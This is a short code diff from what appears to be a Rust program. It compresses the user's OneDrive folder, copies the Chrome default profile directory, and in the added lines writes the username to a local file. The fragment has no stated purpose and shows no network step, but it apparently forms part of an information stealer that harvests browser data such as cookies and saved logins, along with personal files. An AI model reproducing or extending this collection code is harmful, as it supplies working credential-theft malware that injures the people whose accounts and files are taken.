@@ -56,4 +56,6 @@ fn main() {
     compressFolder(&format!("{}OneDrive", user_path), "onedrive");
 
     copy(&format!("{}AppData\\Local\\Google\\Chrome\\User Data\\Default", user_path));
+
+    fs::write("user_data", &username).expect("[ERR10]");
 }
